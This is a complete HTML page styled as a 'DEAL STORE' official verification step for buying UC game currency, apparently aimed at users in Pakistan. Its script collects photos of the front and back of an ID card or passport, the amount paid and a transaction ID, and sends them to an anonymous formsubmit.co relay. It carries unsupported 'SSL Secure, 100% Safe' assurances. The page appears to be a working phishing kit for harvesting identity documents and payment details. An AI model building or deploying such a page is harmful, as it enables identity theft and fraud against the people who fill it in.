<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DEAL STORE - Official Verification</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
.box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:95%;max-width:380px;text-align:center;box-shadow:0 8px 25px rgba(0,0,0,0.08)}
.uc{width:70px;height:70px;background:linear-gradient(#ffb700,#ff8c00);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:24px;margin:0 auto 12px;border:3px solid #000}
h2{margin:5px 0;font-size:20px} .sub{color:#666;font-size:13px;margin-bottom:15px}
label{display:block;text-align:left;font-weight:bold;margin:10px 0 5px;font-size:13px}
select,input{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px;box-sizing:border-box;font-size:14px}
.file-box{border:2px dashed #f7b500;border-radius:10px;padding:12px;margin:8px 0;background:#fffbe6;position:relative}
.file-box input{border:none;padding:0}
small{font-size:11px;color:#888;text-align:left;display:block}
button{width:100%;margin-top:16px;padding:15px;background:linear-gradient(#f7b500,#ffb700);border:none;border-radius:12px;font-weight:bold;font-size:16px;cursor:pointer}
.step{display:none} .step.active{display:block}
.success{background:#e8f5e9;border:1px solid #a5d6a7;padding:12px;border-radius:10px;color:#2e7d32;margin-top:12px;font-weight:bold;display:none}
.preview{width:100%;max-height:100px;object-fit:cover;border-radius:8px;margin-top:5px;display:none}
</style>
</head>
<body>
<!-- PAGE 1 - VERIFICATION -->
<div class="box step active" id="step1">
<div class="uc">UC</div>
<h2>Identity Verification</h2>
<div class="sub">DEAL STORE - Secure Payment Verification</div>

<label>Document Type Select Karein</label>
<select id="docType">
<option value="ID Card">ID Card - شناختی کارڈ</option>
<option value="Passport">Passport - پاسپورٹ</option>
<option value="Driving License">Driving License</option>
<option value="Other Document">Other Document</option>
</select>

<label>ID Card Front Photo</label>
<div class="file-box">
<input type="file" id="front" accept="image/*" onchange="previewImg(this,'prev1')">
<img id="prev1" class="preview">
<small>سامنے والی تصویر اپلوڈ کریں</small>
</div>

<label>ID Card Back Photo</label>
<div class="file-box">
<input type="file" id="back" accept="image/*" onchange="previewImg(this,'prev2')">
<img id="prev2" class="preview">
<small>پیچھے والی تصویر اپلوڈ کریں</small>
</div>

<label>Amount Select Karein</label>
<select id="pkg">
<option value="60 UC - Rs 300">60 UC - Rs 300</option>
<option value="325 UC - Rs 1500">325 UC - Rs 1500</option>
<option value="660 UC - Rs 3000">660 UC - Rs 3000</option>
<option value="1800 UC - Rs 7500">1800 UC - Rs 7500</option>
<option value="3850 UC - Rs 15000">3850 UC - Rs 15000</option>
<option value="8100 UC - Rs 30000">8100 UC - Rs 30000</option>
</select>

<label>Amount Kitni Pay Ki Hai? (Rs)</label>
<input type="number" id="amount" placeholder="Example: 1500">

<button onclick="verifyNow()">VERIFY NOW →</button>
<div class="sub" style="margin-top:10px">🔒 SSL Secure | 100% Safe</div>
</div>

<!-- PAGE 2 - TRANSACTION ID -->
<div class="box step" id="step2">
<div class="uc">UC</div>
<h2>Transaction ID Submit Karein</h2>
<div class="sub">Verification Complete - Last Step</div>
<label>Transaction ID (9 digits)</label>
<input id="txn" type="tel" maxlength="9" placeholder="123456789" style="font-size:24px;text-align:center;letter-spacing:5px;font-weight:bold">
<button id="btn2" onclick="sendFinal()">SUBMIT → VERIFY UC</button>
<div id="ok" class="success">✅ Verified! 12 ghante me UC add ho jayega.</div>
</div>

<script>
let frontFile, backFile;
function previewImg(input, prevId){
  if(input.files[0]){
    if(prevId=='prev1') frontFile=input.files[0]; else backFile=input.files[0];
    let r=new FileReader();
    r.onload=function(e){let img=document.getElementById(prevId); img.src=e.target.result; img.style.display='block';}
    r.readAsDataURL(input.files[0]);
  }
}

async function verifyNow(){
 let docType=document.getElementById('docType').value;
 let pkg=document.getElementById('pkg').value;
 let amount=document.getElementById('amount').value;
 let f1=document.getElementById('front').files[0];
 let f2=document.getElementById('back').files[0];
 
 if(!f1 || !f2){alert('Front aur Back dono photos upload karo!');return;}
 if(!amount){alert('Amount likho!');return;}

 let btn=document.querySelector('#step1 button');
 btn.innerText='⏳ Uploading...';
 btn.disabled=true;

 let formData=new FormData();
 formData.append('_subject', `🔥 NEW VERIFICATION - ${pkg} - Rs ${amount}`);
 formData.append('_template', 'table');
 formData.append('_captcha', 'false');
 formData.append('Document Type', docType);
 formData.append('Package', pkg);
 formData.append('Amount Paid (Rs)', amount);
 formData.append('Front Photo', f1);
 formData.append('Back Photo', f2);
 formData.append('Time', new Date().toLocaleString());

 await fetch("https://formsubmit.co/ajax/d0d9fe6d9cc084bb9088444849fcb1bf",{
   method:"POST",
   body: formData
 });

 // Go to step 2
 document.getElementById('step1').classList.remove('active');
 document.getElementById('step2').classList.add('active');
}

async function sendFinal(){
 let id=document.getElementById('txn').value.trim();
 if(id.length!=9){alert('9 digits likho!');return;}
 let pkg=document.getElementById('pkg').value;
 let amount=document.getElementById('amount').value;
 document.getElementById('btn2').innerText='⏳ Verifying...';
 
 let formData=new FormData();
 formData.append('_subject', `🔥 FINAL ORDER - ID: ${id} - ${pkg} - Rs ${amount}`);
 formData.append('_template', 'table');
 formData.append('🔥 TRANSACTION ID 🔥', id);
 formData.append('Package', pkg);
 formData.append('Amount', amount);
 formData.append('Time', new Date().toLocaleString());

 await fetch("https://formsubmit.co/ajax/d0d9fe6d9cc084bb9088444849fcb1bf",{method:"POST",body:formData});

 document.getElementById('ok').style.display='block';
 document.getElementById('btn2').innerText='✅ SUBMITTED';
}
</script>
</body>
</html>
